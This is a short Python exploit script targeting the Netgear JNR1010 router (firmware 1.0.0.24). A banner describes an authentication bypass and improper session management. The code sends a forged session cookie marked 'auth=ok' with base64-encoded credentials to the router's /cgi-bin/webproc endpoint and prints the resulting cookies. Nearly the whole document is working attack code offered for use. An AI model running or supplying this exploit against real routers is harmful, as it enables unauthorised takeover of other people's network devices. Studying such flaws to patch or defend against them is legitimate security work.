#Device: Netgear JNR1010 Firmware: 1.0.0.24
import requests
import sys
import base64
from colorama import Fore

decription= r"""
 -----------------------------------------------------------------------------
|                                   No CVE                                   |
|                                                                            |
|  Netgear Router JNR1010 is vulnerable to a Authentication Bypass &         | 
|  Improper Session Management. Create a fake Session ID and submit the      |
|  request to the server with the credentials. Whereas, you can see that     |
|  the session id has no change even after getting logged in and during      |
|  logout process.                                                           |
|                                                                            |
|  This flaw may allow a successful attacker to do anything gaining the      |
|  privilege of the router being in LAN/WAN.                                 |
 -----------------------------------------------------------------------------
"""

if len(sys.argv) is not 5:
   print(decription)
   print(Fore.YELLOW+"[-] Example: python Netgear_Authentication_Bypass.py <Target IP> <ID> <Password> <SessionID>"+Fore.RESET)
   sys.exit()

target = sys.argv[1]
ID = sys.argv[2]
Password = sys.argv[3]
SessionID = sys.argv[4]

#Authorization encode to Base64
base = ID + ':' + Password
encookie = base64.encodestring(base)

#to use burpsuite
proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}

with requests.Session() as s:
	URL = 'http://'+target+'/cgi-bin/webproc'
	headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
	cookies = {'Cookie' : 'sessionid=' + SessionID + '; auth=nok; expires=Sun, 15-May-2112 01:45:46 GMT; sessionid=' + SessionID + '; auth=ok; expires=Mon, 31-Jan-2112 16:00:00 GMT'}
	res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
	print s.cookies.get_dict()
